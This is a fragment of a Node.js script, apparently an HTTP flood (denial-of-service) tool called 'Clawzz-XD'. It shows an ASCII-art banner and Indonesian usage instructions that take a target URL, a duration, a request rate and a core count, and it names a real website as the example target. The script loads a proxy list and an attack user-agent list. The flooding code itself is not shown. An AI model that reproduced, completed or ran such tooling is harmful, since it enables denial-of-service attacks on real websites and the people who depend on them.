 ...
 if (process.argv.length < 5){console.log(`　　╱▔▔▔▔▔╲   Clawzz-XD
 ╱  ╱▔╲╲╲▏   author : putra
╱  ╱━╱▔▔▔▔▔╲━╮  
▏ ▕┃▕╱▔╲╱▔╲▕╮┃  
▏ ▕╰━▏▊▕▕▋▕▕━╯  
╲  ╲╱▔╭╮▔▔┳╲╲   
 ...
 ╲   ╲    ╱   ╱ ╲
  ╲  ▕▔▔▔▔▏  ╱╲╲╲▏
 ╱▔  ▕    ▏  ▔╲▔▔
 ╲▂▂▂╱    ╲▂▂▂╱\nHalo kang mohon simak cara pakai tools ini✈: node v4.js link target kang waktunya Jumlah request per detik jumlah core\nContoh abangku: node v4.js https://jkt48.com 90000 100 50 ( rules harap baca file rules.txt untuk mendapatkan panduan request per detik dan core )`); process.exit();}
 ...
 var proxyFile = "prem.txt";
 var proxies = readLines(proxyFile);
 var userAgents = readLines("clawzzattack.txt");
